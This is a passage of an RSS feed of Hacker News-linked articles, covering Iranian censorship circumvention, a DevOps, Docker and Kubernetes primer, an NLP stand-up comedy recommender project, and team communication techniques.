
<p>But even outside of Iran, outspoken diaspora activists like Bashar and Yahyanejad face immense risks. In June, it was reported that an Iranian activist named Ruhollah Zam was <a href="https://www.bbc.com/news/world-middle-east-53238000">sentenced to death </a>in Iran after creating a popular anti-government Telegram news channel that he operated while living in exile in France. The channel, with 1.4 million followers, was shut down shortly after. For Yahyanejad, who knew of Ruhollah through the diaspora community, the ordeal was a shot across the bow. ‚ÄúI can never go back to Iran,‚Äù Yahyanejad admits. ‚ÄúBut I see myself as part of the movement.‚Äù&nbsp;</p>



<p>Yahyanejad‚Äôs work has become crucial for Iranians, even after November‚Äôs shutdown. On July 14, following news that Iran‚Äôs Supreme Court had upheld the death sentences of three young anti-regime protesters, Iranians took to banned social media sites in an unprecedented protest, with over 6 million posts under the hashtag #DontExecute. Hours after #DontExecute began trending online, digital rights organization NetBlocks <a href="https://twitter.com/netblocks/status/1283106806332620801?s=20">monitored disruptions in the network</a>. Panicked users, still reeling from November‚Äôs shutdown, speculated another block was imminent. Luckily, an all-out ban didn‚Äôt occur, but the renewed threat of one was enough to increase Toosheh‚Äôs usage by more than 50% in the days that followed.&nbsp;</p>



<p>For Yahyanejad, who has been actively fighting the Iranian regime‚Äôs censorship for over a decade, the past year is proof that his work is even more necessary. ‚ÄúInternet shutdowns are psychological tools designed to terrify populations, to convince them that they are voiceless,‚Äù he says. ‚ÄúFighting shutdowns is important so that you can show people that they are not alone and that there are others.‚Äù</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/cat-and-mouse-censorship/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585986</guid>
            <pubDate>Fri, 25 Sep 2020 02:26:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Explicitly Comprehensible Functional Reactive Programming [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585849">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://futureofcoding.org/papers/comprehensible-frp/comprehensible-frp.pdf | <a href="https://web.archive.org/web/*/https://futureofcoding.org/papers/comprehensible-frp/comprehensible-frp.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://futureofcoding.org/papers/comprehensible-frp/comprehensible-frp.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585849</guid>
            <pubDate>Fri, 25 Sep 2020 02:01:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting started with DevOps, containers, and Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585356">thread link</a>) | @gk1
<br/>
September 24, 2020 | https://www.datree.io/resources/devops-containers-kubernetes | <a href="https://web.archive.org/web/*/https://www.datree.io/resources/devops-containers-kubernetes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div id="resource"><p>DevOps isn‚Äôt only a fun amalgam of two terms (developers and operations), it has its own culture within small organizations, startups, and digital factories where there is a high demand for efficient communication between teams, and agility and flexibility at both the development and operational level. Over the last several years, DevOps has been successfully implemented across top enterprises like Amex, Facebook, LinkedIn, Microsoft, Amazon and too many others to count.</p><h2>Getting started with DevOps</h2><p>The goal of DevOps is to unify application development (Dev) and its operations (Ops) throughout the software development life-cycle (SDLC), from strategy, planning, coding, building, and testing, through release, deploy, operate and <a href="https://datree.io/" data-rt-link-type="external">monitor</a>. DevOps encourages the maximum possibility of automation by using DevOps tools and scripts.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f97ee281871_devops.png"></p></figure><p>Dev and Ops in the software development lifecycle</p><p>Amazon brings the slogan ‚ÄòYou build it, you run it‚Äô which aims to bring a product from development to production and cut time-to-market by anywhere from 10-15 days.</p><h3>Version Management with GitFlow</h3><p>For the source code of the application, rather than using a monolithic repository, I recommend using one repository by each microservice. The management of the <a href="https://www.atlassian.com/git/tutorials/comparing-workflows/gitflow-workflow" target="_blank" data-rt-link-type="external">GitFlow workflow</a> would be represented in this context. You can create a feature branch and a release branch before applying the ‚Äòbranch filter‚Äô when you create your ‚Äòbuild‚Äô definition (more on this below).</p><h3>CI/CD Workflow</h3><p>DevOps can‚Äôt be separated from the concept of CI/CD. Continuous integration (CI) simply means a series of practices to implement when integrating working copies to a shared repository. It represents the beginning of the CI/CD pipeline which starts from the new changes in source code and is committed from a local source control repository then pushed to a remote source code repository, a trigger based on the aforementioned process can be configured to trigger an automated build, and it is also possible to run tests during the build.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c45315226ac9a7d11_releasepipelineCI.png"></p></figure><p>Continuous Integration</p><p>CI/CD tools such as Visual Studio Team Services (VSTS) provided by Microsoft allows you to create the Build definition to turn this process into reality. It allows you to configure different build tasks, and these tasks perform the build from the source code. There are two kinds of triggers available in VSTS:</p><ul><li>Continuous integration trigger: this is applied on a Git, TFS ( which is recommended by Microsoft) or another source control repository which allows you to specify a listening branch while new changes in code are committed and then run an automated build.</li><li>Scheduled trigger: this is applied on select days and times to run an automated build.</li></ul><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f31b7281872_CI.png"></p></figure><p>Two types of build triggers</p><p>Other available DevOps tools that I‚Äôd like to mention are Jenkins, Ansible, Github, and Bitbucket.</p><h3>Continuous Delivery vs Continuous Deployment</h3><p>Let‚Äôs continue discussing CI/CD, the release part of pipeline started when a new, successful build is available. There are two types of CD which is continuous delivery and continuous deployment.</p><p>Continuous delivery is a series of practices to deliver each change to a staging environment which can then be deployed to production in a manual way.</p><p>Continuous deployment is different from continuous delivery because every change after a successful build is deployed to production in an automatic way.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c071de866dceeb7ca_puppet_continuous_diagram.gif"></p></figure><p>Continuous Delivery vs Continuous Deployment</p><p>Similarly, VSTS also allows the continuous delivery or deployment by creating a ‚Äòrelease‚Äô definition (shown below). The definition can be based on the build from VSTS or directly from Jenkins or another source that publishes the artifact to be deployed:</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f0472281873_release-definition-.png"></p></figure><p>Creating release definition from different artifacts</p><p>And then, by configuring different release tasks, these tasks can be automated or manual as shown:</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c071de8797deeb7cb_task-catalog.png"></p></figure><p>Task catalog in release definition</p><h2>Getting Started With Containers</h2><p>As high-level virtualization technology, containers provide an isolated and independent environment. Containers such as Docker perform the virtualization of the operating system as well as the related infrastructure. Docker enforces the portability and agility of applications and acts as a deployment unit while deploying multiple containers clusters.</p><h3>Docker Architecture</h3><p>Docker uses a client-server architecture and can be built into three essential parts: the Docker client, the Docker host with Docker daemon and Docker registry within the architecture.</p><ul><li>Docker Client where Docker environments should be installed to build Docker images with a target application.</li><li>Docker Host is a managed host with Docker daemon (also known as Dockerd which is the persistent process that manages containers).</li><li>Docker Registry provides or stores different Docker images. The best known open communities for Docker images are Docker hub, nginx (the official Docker image) and the Docker store.</li></ul><p>The Docker client can communicate with Docker daemon by using the RESTful API over UNIX sockets or a network interface in two ways:</p><ul><li>Docker clients can run on the same system with Docker daemon.</li><li>Docker clients connect to a remote Docker daemon.</li></ul><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f09e4281874_Screen-Shot-2018-06-13-at-19.12.20.png"></p></figure><p>Docker architecture</p><p>Other important Docker related tools are:</p><p>Docker Compose is a tool used to define and run multi-container Docker applications. A configuration file in YAML format is used to configure your application‚Äôs services.</p><p>A DockFile is necessary to define what will be added in the Docker container, then paired with the Docker command to build a Docker image and pull the image to the Docker registry.</p><h3>Docker on Azure</h3><p>Microsoft Azure provides the Azure Container Service (ACS) to secure and manage enterprise container apps in the cloud and an Azure Container Registry (ACR) to manage Docker images which are controlled by Azure AD. Azure also provides Azure Container Instances (ACI) which offers a more simple, faster way to run a container in Azure without thinking about the infrastructure level.</p><p>Microsoft also provides some useful tools while working with Docker in Azure such as Virtual Studio online, Visual Studio code, and the Visual Studio extension Docker.</p><h3>Container-clustering Solutions in Azure</h3><p>To run an application with more than 100 instances to act as container clusters, there are a couple of container orchestrators which simplify the management of container clusters.</p><p>The open-source container orchestrators are popular in the market such as Docker Swarm, Kubernetes, and Marathon of Mesosphere‚Äôs DC/OS (which is designed for big data analytics solution and facilities to deploy Hadoop clusters, OpenShift, Rancher, CoreOS Tectonic, Docker EE and others).</p><h3>Kubernetes in Azure</h3><p>As time goes by, I think that Kubernetes is winning the competition between container orchestrators for many reasons. Microsoft Azure has also launched a service currently in preview mode, Azure Kubernetes Service (AKS). Microsoft considers Kubernetes the best balance between function and performance. It applies master/slave architecture which is a model of communication where one device or process acts as the master to control one or more other devices (slave). It facilitates the deployment of microservices while each node should scale and work independently.</p><p>Microsoft recommends deploying multiple masters (generally three nodes as master node) in Azure, then balances the number of slave nodes depending on the scenario. If you‚Äôre working with Microsoft Azure and need to deploy clusters with master/slave architecture, you can check my <a href="https://github.com/cloudmelon/azure-multiple-vmss-linux" target="_blank" data-rt-link-type="external">GitHub repository</a> where you can find some useful ARMs (Azure Resource Manager) templates.</p><p>Microsoft Azure also provides a container service known as Azure Container Services. It implements the popular container orchestrators managed by Kubernetes in Azure, and it offers many useful features such as:</p><ul><li>Easy management of containers even when there are more than 100 instances.</li><li>Easy scaling.</li><li>Support popular operating systems such as Linux and Windows.</li><li>Easy roll-out and rollback.</li><li>Can combine with batch processing or cron jobs.</li><li>Automatic bin packing (e.g., depends on GPU/CPU usage).</li></ul><p>In the Azure Marketplace, a standard/advanced version of Docker EE for Azure is available so users can deploy Docker directly in Azure. There are options such as Mesos (DC/OS on Azure) for the same purpose.</p><h3>Reference Deployment Methods</h3><p>To improve the resilience of the applications that we‚Äôve deployed with container-clustering solutions, I‚Äôd like to recommend several deployment methods.</p><h3>Blue/Green Deployment</h3><p>Blue/Green deployments, also known as B/G deployments or Red/Black deployments. The main principle is to deploy two identical environments which are configured in the same way. Generally, while one environment is live and in use by users, the other environment stays idle. When downtime occurs, this architecture allows to redirect the incoming traffic to the idle configuration which runs the original version with the help of load balancer. The target is to reduce downtime during production deployments.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f2387281875_BG-Deployment.png"></p></figure><h3>Canary Release</h3><p>In this method ‚Äì which is typically used in production without impacting the current version ‚Äì the implementation is similar to B/G deployment by deploying the latest version of the application into production which acts as a ‚Äòcanary.‚Äô This version integrates with other apps and every infrastructure environment to simulate what it will look like in the real production, but to which no public users are routed at the moment. After that, all related influencers feel satisfied with the new version, more servers will be released and more users will be routed to the new version. Remember to implement a safety rollback strategy in case of any issue detected in the future.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497cf0c4151b513deec5_canary-release.jpeg"></p></figure><p>Canary release</p><h3>Recommended Deployment Tools</h3><p>Infrastructure as code software such as TerraForm would be a great choice to manage the high-level configuration. It creates files with a .tf extension and the content in YAML format.</p><p>The command you need to apply to all your configurations is terraform apply.</p><h2>Conclusion</h2><p>Digital transformations ‚Äì when transitioning from on-premise to the cloud ‚Äì DevOps, ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.datree.io/resources/devops-containers-kubernetes">https://www.datree.io/resources/devops-containers-kubernetes</a></em></p>]]>
            </description>
            <link>https://www.datree.io/resources/devops-containers-kubernetes</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585356</guid>
            <pubDate>Fri, 25 Sep 2020 00:47:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recommender Systems Are a Joke ‚Äì Unsupervised Learning with Stand-Up Comedy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585210">thread link</a>) | @sebg
<br/>
September 24, 2020 | https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/ | <a href="https://web.archive.org/web/*/https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
  
  <time datetime="2020-09-18T00:00:00+00:00">18 Sep 2020</time>
  <p><em>Disclaimer: This post as well as the code accompanying it contains some direct and indirect references to potentially 
offensive language. This is an analysis of stand-up comedy, which tends to contain curse words, racial slurs, etc. 
However, all references are made with objective, academic intent. If you have any concerns with my treatment of 
certain language, I‚Äôd be happy to have a conversation. You can get in touch with me via <a href="https://www.linkedin.com/in/kaplanstephen/" target="_blank">LinkedIn</a>.</em></p>

<p>This post documents my first foray into unsupervised learning, natural language processing, and 
recommender systems. I completed this project over a 2-week span during my time as a student at
<a href="https://thisismetis.com/" target="_blank">Metis</a>.</p>

<p>The code for this project can be found <a href="https://github.com/stephenjkaplan/standup-comedy-recommender" target="_blank">here</a>.
The Flask app I made for this project can be found <a href="https://standup-comedy-recommender.herokuapp.com/" target="_blank">here</a>.</p>

<h3 id="intro">Intro</h3>

<p><img src="https://stephenjkaplan.github.io/images/2020-09-18/comedy.jpg" alt="Comedy">
<small>Comedy! (Image: <a href="https://scrapsfromtheloft.com/stand-up-comedy-scripts/">Scraps from the Loft</a>)</small></p>

<p>A little over halfway through the Metis data science bootcamp, the curriculum shifted from 
<a href="https://en.wikipedia.org/wiki/Supervised_learning" target="_blank">supervised</a> to 
<a href="https://en.wikipedia.org/wiki/Unsupervised_learning" target="_blank">unsupervised</a> learning. At that point, my brain was<br>
firmly in ‚Äúpredict y given X‚Äù mode, and it quite honestly took a few days to wrap my head around what it means 
to use machine learning on unlabeled data, and why that would even be useful. It clicked when I applied a 
rudimentary model of the human brain to both of these approaches: often our brains make inferences based 
on our previous experiences and knowledge (supervised learning). However, sometimes we are forced to find previously 
unseen patterns in the world around us (unsupervised learning) before we can make decisions.</p>

<p>Concurrently, we were introduced to 
<a href="https://en.wikipedia.org/wiki/Natural_language_processing" target="_blank">Natural Language Processing</a> (NLP). In addition 
to learning a lot specifically about NLP, one big takeaway was a clearer understanding of what is meant by
‚ÄúArtificial Intelligence‚Äù in the context of machine learning - any instance 
of a computer being able to imitate (or even replicate) a human perception or ability. After this realization, 
I went from being somewhat weary of apply machine learning to text/speech, to extremely motivated to 
work on an NLP problem.</p>

<p>As you might expect, the main requirements of this project were:</p>
<ol>
  <li>Use unsupervised learning.</li>
  <li>Use text as the primary data source.</li>
</ol>

<p>I almost instantly came up with an idea. Stand-up comedy specials are usually in a 1-hour monologue 
format, and are rich and diverse in topics, opinions, colloquialisms, and regional english dialects.
For that reason, and also the fact that I‚Äôm a huge fan of the comedy world, I knew that this would be
a stimulating project.</p>

<h3 id="data-wrangling">Data Wrangling</h3>

<p>Luckily, I was able to quickly find a website 
(<a href="https://scrapsfromtheloft.com/stand-up-comedy-scripts/" target="_blank">Scraps from the Loft</a>) with several hundred 
comedy transcripts. I used the Python <a href="https://requests.readthedocs.io/en/master/" target="_blank">requests</a>) library 
in a <a href="https://github.com/stephenjkaplan/standup-comedy-recommender/blob/master/analysis/data_acquisition.py" target="_blank">script</a> to acquire all of the raw HTML for each transcript, and 
<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/" target="_blank">Beautiful Soup</a> to parse the main text and 
various metadata (comedian, title of comedy special, year).</p>

<p>After inserting the data into pandas dataframes (one for the metadata and one for the text corpus), I stored 
it in a remote <a href="https://www.mongodb.com/" target="_blank">Mongo</a> database on an Amazon AWS EC2 instance. Admittedly, 
this wasn‚Äôt really necessary as my corpus was small enough to store locally , but I wanted to get more comfortable with 
both creating MongoDB collections and querying data for analysis and modeling using 
<a href="https://pymongo.readthedocs.io/en/stable/" target="_blank">pymongo</a>.</p>

<h3 id="data-cleaning--the-nlp-pipeline">Data Cleaning &amp; The NLP Pipeline</h3>

<p>As we had been warned, cleaning and preparing the text corpus proved to be the most critical, time 
consuming part of this project. Topic modeling (and clustering) of text data relies on sufficient elimination 
of extraneous words, but also careful inclusion of words that might be indicators of a topic.</p>

<p>First, I performed some ‚Äúmacro‚Äù cleaning, removing entire documents (individual transcripts) that would 
throw off the modeling and/or not be relevant in a recommender app. That involved removing:</p>
<ul>
  <li>Comedy specials in different languages (there were a handful in Italian and Spanish).</li>
  <li>Comedy specials that are not widely available (or available at all) on streaming platforms.</li>
  <li>Short-form comedy such as <a href="https://www.youtube.com/watch?v=--IS0XiNdpk" target="_blank">monologues on Saturday Night Live</a>, 
or other late night TV shows.</li>
</ul>

<p>I then created an ‚Äú<a href="https://github.com/stephenjkaplan/standup-comedy-recommender/blob/master/app/nlp_pipeline.py" target="_blank">NLP pipeline</a>‚Äù, 
that can take any document from the corpus and perform the following transformations:</p>
<ul>
  <li>Clean the text by removing punctuation, non-essential parts like the person introducing the comedian, 
removing numbers, removing line breaks, crazy noises and expressions like ‚Äúaaaaah‚Äù, and common English 
<a href="https://en.wikipedia.org/wiki/Stop_word" target="_blank">stop words</a>.</li>
  <li>‚ÄúLemmatized‚Äù words to reduce all forms of words to their base or ‚Äúlemma‚Äù. (For example, ‚Äústudies‚Äù and 
 ‚Äústudying‚Äù become ‚Äústudy‚Äù). The purpose of this is to extract the core meaning and topics out of the text 
 rather than pay attention to how words are being used in the context of a sentence. The Python <a href="https://www.nltk.org/" target="_blank">NLTK</a> library 
 was very useful for this step and several of the previous steps.</li>
  <li>‚ÄúVectorized‚Äù the entire corpus. In general, this means converting the long strings of text to tabular format, 
 where each column is a word, each row represents a document in the corpus (also known as a 
 <a href="https://en.wikipedia.org/wiki/Document-term_matrix" target="_blank">doc-term matrix</a>), and each cell 
 contains a numerical representation of the words frequency of use or some other metric.</li>
</ul>

<p><img src="https://stephenjkaplan.github.io/images/2020-09-18/cleaning.png" alt="cleaning">
<small>Summary of text cleaning steps.</small></p>

<p>The final data format is ‚Äúfit‚Äù on the initial dataset, and then applied to any incoming data (as is the case with 
the <a href="#search-engine-recommender-with-content-based-filtering">search engine feature</a> described later in this post.)</p>

<p>To elaborate a bit on vectorization: I focused on trying out two <a href="https://scikit-learn.org/stable/modules/classes.html#module-sklearn.feature_extraction.text" target="_blank">types/implementations of vectorization in 
scikit-learn</a>:</p>
<ol>
  <li><a href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.CountVectorizer.html#sklearn.feature_extraction.text.CountVectorizer" target="_blank">Count Vectorizer</a>,
which simply counts the frequency of each word in each document/transcript.</li>
  <li><a href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.TfidfVectorizer.html#sklearn.feature_extraction.text.TfidfVectorizer" target="_blank">TF-IDF Vectorizer</a>,
which calculates the product of term frequency with its inverse-document frequency (a scale of 0 to 1 where values 
closer to zero are common in the entire dataset of transcripts). This is a valuable metric because it weights 
words that are common in a document more heavily if they aren‚Äôt common in general, which is a useful tool for 
ultimately extracting distinct topics.</li>
</ol>

<p>In general, creating this pipeline was an iterative process. I tried out different transformations and did 
topic modeling (explained in the next section) to evaluate the effectiveness of different components in the pipeline. 
This helped inform my decision to vectorize the text with <strong>TF-IDF</strong>, as it yielded topics that were much 
more discernible and easy to label by looking at each topic‚Äôs top words.</p>

<p>One other note important note is that using pre-built lists of common English stop words to remove from the 
dataset isn‚Äôt a complete solution. I had to do quite a bit of combing through the transcripts to identify 
insignificant, yet common words and manually add them to the stop words list. It may come as no surprise that 
curse words are extremely prevalent in comedy, and don‚Äôt usually add much meaning, so I had to include some 
pretty aggressive words in my code (several of which are fairly offensive and I wouldn‚Äôt use in conversation).</p>

<p>Aside from also removing names/other irrelevant proper nouns, I also had to carefully decide what to do about racial slurs.
Like it or not, racial slurs are common in stand-up comedy and can sometimes carry important meaning with regards to a 
comedian‚Äôs jokes. As a result, I left many of them in the dataset, but was also tasked with the uncomfortable task of 
hard-coding some extremely antiquated language in the NLP pipeline class for removal.</p>

<h3 id="modeling--flask-app-features">Modeling &amp; Flask App Features</h3>

<p>My main objective for this project was to develop a Flask application that provided more nuanced 
recommendations of comedy specials than what‚Äôs currently available on mainstream streaming platforms. I scoped 
out two features:</p>

<ol>
  <li>A dropdown genre filter using genres that were created by machine learning algorithms (as opposed to 
human labeling.)</li>
  <li>A search bar that allows a user to describe the comedy they want to see, and get content-based 
recommendations.</li>
</ol>

<p>You can play around with the app <a href="https://standup-comedy-recommender.herokuapp.com/" target="_blank">here</a>.</p>

<h4 id="automatic-genre-filters-with-topic-modeling">Automatic Genre Filters with Topic Modeling</h4>

<p>Creating machine-learned genres involves first applying the unsupervised learning technique of 
<a href="https://en.wikipedia.org/wiki/Topic_model" target="_blank">topic modeling</a>, transforming the resulting 
data to extract which words are most closely related with each topic, and then performing the manual task 
of giving each topic a reasonable label.</p>

<p>In relatively simple terms, topic modeling involves reducing the dimensions of the document-term matrix (words) to a specified number 
of columns (representing the topics, and a weighting for each topic to each document). I tried a few different dimensionality reduction techniques including 
<a href="https://en.wikipedia.org/wiki/Latent_semantic_analysis" target="_blank">Latent Semantic Analysis</a> (LSA), 
<a href="https://en.wikipedia.org/wiki/Latent_Dirichlet_allocation" target="_blank">Latent Dirichlet Allocation</a> (LDA), and 
<a href="https://en.wikipedia.org/wiki/Non-negative_matrix_factorization" target="_blank">Non-Negative Matrix Factorization</a> (NMF). 
Ultimately, the 
<a href="https://scikit-learn.org/stable/modules/generated/sklearn.decomposition.NMF.html" target="_blank">scikit-learn implementation of NMF</a>
yielded the most discernible topics.</p>

<p><img src="https://stephenjkaplan.github.io/images/2020-09-18/topics.png" alt="topics">
<small>Examples of top words associated with modeled topics.</small></p>

<p>Based on the top words generated from each topic, I used my knowledge of comedy to select the following genres:</p>
<ul>
  <li><strong>Observational</strong>: This is sort of a catch-all for ‚Äúaverage‚Äù, ‚Äúevery day‚Äù topics such as family, chores, marriage, pets, etc. This type of 
 comedy is quite common.</li>
  <li><strong>Immigrant Upbringing</strong>: Many comedians are 1st generation Americans with parents that immigrated to the US and brought their 
culture with them. Comedians with recently immigrated families often talk about the humorous struggles of assimilation, the quirks 
of their various cultures, the pressures of their parents, and hardworking nature of their families.</li>
  <li><strong>Relationships &amp; Sex</strong>: This is another very common topic in comedy, particularly for ‚Äúdirty‚Äù comedians. The sub-topics range 
from dating, to LGBTQ humor, and heavily sexual jokes.</li>
  <li><strong>British/Australian</strong>: This topic was selected almost entirely based on colloquialisms of the comedian. While the United Kingdom 
and Australia have different cultures, they share some slang in common. If I were to continue to spend time on this project, I would 
probably try and separate these two topics, as British comedy historically is associate with a specific type of ‚Äúdry‚Äù humor. That being said,
many non-American english-speaking comedians share a common ‚Ä¶</li></ul></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/">https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/</a></em></p>]]>
            </description>
            <link>https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585210</guid>
            <pubDate>Fri, 25 Sep 2020 00:22:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four communication techniques for solving technical problems]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585139">thread link</a>) | @sebg
<br/>
September 24, 2020 | https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/ | <a href="https://web.archive.org/web/*/https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-67">
	<!-- .entry-header -->

	
	
	<div>
		
<p>All data and engineering teams are faced with a constant inflow of organizational, technical, and interpersonal problems and the ability of your team to have business impact will depend largely on how effectively it can move towards optimal solutions to those problems.&nbsp; In this article, I discuss<em> four communication techniques</em> that improve the ability of a team to solve problems.</p>



<figure><img loading="lazy" src="https://documents.app.lucidchart.com/documents/4a162d92-9c91-4478-91b4-b893591b316f/pages/0_0?a=624&amp;x=109&amp;y=38&amp;w=844&amp;h=253&amp;store=1&amp;accept=image%2F*&amp;auth=LCA%2015c6c000cf3d2ca79ca0f2238c9ccfd56666e1b7-ts%3D1600622689" alt="" width="553" height="164"></figure>



<p><strong><em>Work from the problem to the solution:&nbsp; move in the right direction.</em></strong></p>



<p>When presented with a problem, first spend time elucidating the problem space before addressing potential solutions.&nbsp; Interestingly, I think the intuitive and most common approach is to do the opposite: present and advocate for your solution. &nbsp; I think the reason for this is that people tend to assume that others understand the problem as clearly as you do, that you have a full understanding of the problem, and that you understand which aspects of the problem are the most critical to solve for the business.&nbsp; Thus, the only thing that is interesting is the solution you came up with ‚Äì a solution that is either clever or based on your notable experience.&nbsp;</p>



<p>The problem though is that these assumptions are usually wrong.&nbsp; Typically if you spend time first fleshing out the problem, you will realize that other people on the team have context on the problem that you don‚Äôt have.&nbsp; Or that they do not share an understanding of what the problem is or that there is disagreement about what aspects of the problem are the most critical to solve first.&nbsp; Often you will realize that people are focused on solving the technical problem but that they do not have a good understanding of the <em>business </em>problem.&nbsp; It is critical that the business problem is clearly fleshed out before addressing the technical problem.</p>



<p><em>Recommendation.&nbsp; </em>Spend time talking about the problem before anyone presents solutions.&nbsp; It will make sure everyone has the same context.&nbsp; It ensures that the business problem is the focus and that people will agree ‚Äì <em>before presenting their solution ideas</em> ‚Äì which aspects of the problem are the most critical to solve. This process helps remove ego from the conversation, which can develop when a group of smart highly experienced present different solutions that incidentally emphasize different aspects of the problem.&nbsp; Time spent on the problem space consistently will help you identify better solutions, more efficiently, and with less drama.</p>



<figure><img loading="lazy" src="https://documents.app.lucidchart.com/documents/4a162d92-9c91-4478-91b4-b893591b316f/pages/0_0?a=624&amp;x=121&amp;y=330&amp;w=853&amp;h=272&amp;store=1&amp;accept=image%2F*&amp;auth=LCA%2025c83fef8709e6b41929b2f07e7877b84a6ba280-ts%3D1600622689" alt="" width="576" height="183"></figure>



<p><strong><em>Split-tracking ‚Äì prevent circular and chaotic conversations.&nbsp;</em></strong></p>



<p>I have seen a number of conversations about thorny problems go in circles and not only fail to identify good solutions but even make little progress towards a shared understanding of the problem space.&nbsp; How do you prevent this from happening?&nbsp; The primary thing to do is to keep your conversation organized.&nbsp;&nbsp;</p>



<p>One way to do so is to use a technique called <em>split-tracking</em>.&nbsp; Split-tracking is a technique, in which you identify that more than one issue or concern has been raised, bring group awareness to this observation, generate consensus that there is more than one issue at play, and then push others to focus on one issue at a time. &nbsp; Why does this help? &nbsp; People often don‚Äôt realize that they are conflating two issues so they don‚Äôt realize when they are jumping back and forth between these issues.&nbsp; If these issues are not explicitly identified and separated, it can be hard to probe and press a person‚Äôs thinking on an issue ‚Äì they can unconsciously side-step into the second issue. If there are multiple people discussing a problem, it is possible for people to start going in circles if different people re-direct the group to a secondary issue and then another person brings it back to the first issue.&nbsp;&nbsp;</p>



<p><em>Recommendation.&nbsp; </em>Be on the lookout for multiple underlying issues and concerns.&nbsp; If you see them, stop the conversation and say,  ‚ÄúI am hearing two issues here.&nbsp; One is issue $X and other is issues $Y.&nbsp; Which one should we focus on first?‚Äù &nbsp; Make sure other people realize that there are separate issues ‚Äì even if they are correlated ‚Äì and get them to agree to work on them separately.&nbsp; In general, think like a scientist ‚Äì care about the taxonomy of your problem and neatly classify all the sub-problems that exist and their relation to each other (i.e., this is a subproblem of this bigger problem).&nbsp; You can work towards a solution much more effectively, if the problem space is well organized and explicitly understood by everyone in the conversation.&nbsp;</p>



<p><strong><em>Empathy ‚Äì prevent friction and ‚Äúland mines‚Äù from stopping forward progress.</em></strong></p>



<p>Have you ever been in a meeting discussing a problem, making some progress, and then just suddenly had all forward progress come screeching to a halt? &nbsp; Usually this happens when people become defensive or if the conversation triggered an emotional response in someone.&nbsp; How do we prevent this from happening?&nbsp; Although each individual needs to work to keep the bigger picture in mind and to keep their ego out of the conversation, you cannot control other people‚Äôs reactions.&nbsp; So what can you do?&nbsp;</p>



<p><em>Recommendation.&nbsp; </em>Work on being more empathetic in your communication.&nbsp; Carefully consider how others view the problem and how some aspects of the problem may impact them and their work more than you.&nbsp; Consider that even if they have less relevant experience than you, that they still want their viewpoints to be considered and valued.&nbsp; In general, approach people and their thoughts with curiosity.&nbsp; Try to clarify your understanding of their perspective and make it clear that you are spending time trying to understand their views.</p>



<p>If you do this, you will be less likely to trigger an emotional response that will put a lot of friction between you and your solution.&nbsp; You will make people feel heard even if the solution that is ultimately arrived at doesn‚Äôt solve their main pain points. When you approach problems empathetically, it is also easier to build consensus and excitement in the group, which is critical. Identifying the solution is not the final step ‚Äì implementing the solution is, and you want a motivated team to tackle that step.&nbsp;</p>



<p>Emphasizing empathy when working with others has a few other advantages.&nbsp; One, because empathy is driven by curiosity about someone‚Äôs perspective, it makes it easier to identify genuine issues that you hadn‚Äôt been considering previously, thereby enriching your understanding of the problem.&nbsp; Two, it will help you identify nuances in the concerns of others, providing opportunities for split-tracking and organization of the conversation.&nbsp; Three, empathetic communication enhances psychological safety of the group, which in turn means that all people will feel comfortable voicing their concerns and insights. A group that can communicate openly will be better at fleshing out the full problem space and thereby will be better at identifying the optimal solution.&nbsp;&nbsp;&nbsp;</p>



